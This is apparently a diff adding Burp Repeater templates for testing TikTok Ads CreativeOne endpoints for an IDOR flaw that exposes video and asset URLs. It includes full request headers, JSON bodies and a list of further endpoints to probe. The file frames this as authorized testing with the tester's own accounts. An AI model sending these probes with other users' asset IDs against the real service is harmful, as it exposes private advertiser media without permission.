@@ -1,0 +1,112 @@
+# Burp Repeater templates — CreativeOne asset/URL-disclosure candidates
+#
+# How to use:
+#   1. In Burp, right-click your original BatchGetImgURLs request -> "Copy to file"
+#      or just duplicate it in Repeater for each block below.
+#   2. Keep every header from your original captured request AS-IS
+#      (Cookie, X-Csrftoken, Sec-Ch-Ua, etc.) — only change the request line
+#      (path) and the JSON body.
+#   3. Burp auto-recalculates Content-Length on edit by default
+#      (Settings -> Tools -> Repeater/HTTP -> "Update Content-Length header").
+#      If yours doesn't, just delete the Content-Length header line — Burp
+#      re-adds a correct one when the request is sent over HTTP/2.
+#   4. The test that matters: send each request with (a) an asset ID/URI you
+#      own, confirm it works, then (b) an asset ID/URI belonging to a
+#      DIFFERENT account/advertiser you also control (a second test account),
+#      or one you can otherwise prove you don't own. If (b) still returns a
+#      usable URL, that's the IDOR — same bug class as BatchGetImgURLs.
+#
+# ============================================================
+# 1) CONFIRMED SCHEMA — CreativeOne/Asset/BatchGetClientVideoURLs
+#    (direct video sibling of your BatchGetImgURLs finding; field name
+#    "videoIDs" pulled straight from the app's own client code)
+# ============================================================
+POST /CreativeOne/Asset/BatchGetClientVideoURLs HTTP/2
+Host: ads.tiktok.com
+Cookie: [PASTE FROM YOUR CAPTURED REQUEST]
+Content-Length: 31
+X-Screen-Width: 1512
+Sec-Ch-Ua-Platform: "macOS"
+X-Browser-Language: en-GB
+X-Cookie-Enabled: true
+X-Screen-Height: 982
+Sec-Ch-Ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"
+Sec-Ch-Ua-Mobile: ?0
+X-Browser-Platform: macOS 10.15.7
+Agw-Js-Conv: str
+Accept: application/json, text/plain, */*
+Content-Type: application/json
+X-Browser-Name: Not=A?Brand
+X-Csrftoken: [PASTE FROM YOUR CAPTURED REQUEST]
+X-Timezone-Name: Africa/Lagos
+X-Browser-Version: 99
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+S-Data-Center: 1
+Origin: https://ads.tiktok.com
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://ads.tiktok.com/creative/assets/my-brand?region=row
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Priority: u=1, i
+
+{"videoIDs":["SAVED_VIDEO_ID"]}
+
+# ============================================================
+# 2) PARTIAL SCHEMA — CreativeOne/OrderCommand/ClientGenerateVideoShareLink
+#    Field names confirmed from client code: campaignID, itemIDs, videoIDs,
+#    sharingType, recommendFilter, allItemIDs, excludeItemIDs.
+#    Types/required-ness NOT confirmed — send this, read the error response
+#    for "missing field" / "invalid type" hints, and adjust. Note this one's
+#    "traffic" is "local" not "row" in the client code, so it may route to a
+#    different DC — try both S-Data-Center: 1 and removing that header if it 400s.
+# ============================================================
+POST /CreativeOne/OrderCommand/ClientGenerateVideoShareLink HTTP/2
+Host: ads.tiktok.com
+Cookie: [PASTE FROM YOUR CAPTURED REQUEST]
+Content-Length: 0
+Sec-Ch-Ua-Platform: "macOS"
+X-Browser-Language: en-GB
+X-Cookie-Enabled: true
+Sec-Ch-Ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"
+Sec-Ch-Ua-Mobile: ?0
+X-Browser-Platform: macOS 10.15.7
+Agw-Js-Conv: str
+Accept: application/json, text/plain, */*
+Content-Type: application/json
+X-Browser-Name: Not=A?Brand
+X-Csrftoken: [PASTE FROM YOUR CAPTURED REQUEST]
+X-Timezone-Name: Africa/Lagos
+X-Browser-Version: 99
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Origin: https://ads.tiktok.com
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://ads.tiktok.com/creative/assets/my-brand?region=row
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Priority: u=1, i
+
+{"campaignID":"YOUR_OWN_CAMPAIGN_ID","itemIDs":[],"videoIDs":["SAVED_VIDEO_ID"],"sharingType":1,"recommendFilter":false,"allItemIDs":false,"excludeItemIDs":[]}
+
+# ============================================================
+# 3) PATH-ONLY — no field schema recovered from the static bundles fetched
+#    (their request-building code lives in a page-specific chunk this
+#    recon didn't pull down). Fastest way to get the real body: open Burp's
+#    proxy, click into the matching feature in the ads.tiktok.com UI, and
+#    grab the live request — then swap in a foreign asset ID the same way.
+#
+#    /CreativeOne/OrderQuery/GetVideoUrlByVideoIDOrItemID   <- try {"videoID":"X"} or {"itemID":"X"}
+#    /CreativeOne/OrderQuery/ClientBatchGetItemPreview       <- try {"itemIDs":["X"]}
+#    /CreativeOne/OrderCommand/GeneratePreviewLink
+#    /CreativeOne/OrderCommand/ClientGenerateShareLinkForContents
+#    /CreativeOne/PartnerBusiness/ClientGenerateShareLink
+#    /CreativeOne/InviteLink/ClientGetVideoByURL              <- takes a URL/URI, not ID
+#    /CreativeOne/Creator/UserGenTTOCollabsSavedListURL
+#    /CreativeOne/TopAds/MaterialDetail                       <- try {"materialID":"X"} or {"materialId":"X"}
+#    /CreativeOne/TopAds/MaterialList
+#    /CreativeOne/TopAds/SearchMaterial
+#    /CreativeOne/OrderCommand/ClientDownloadVideo
+#    /CreativeOne/OrderCommand/ClientDownloadVideoDetail
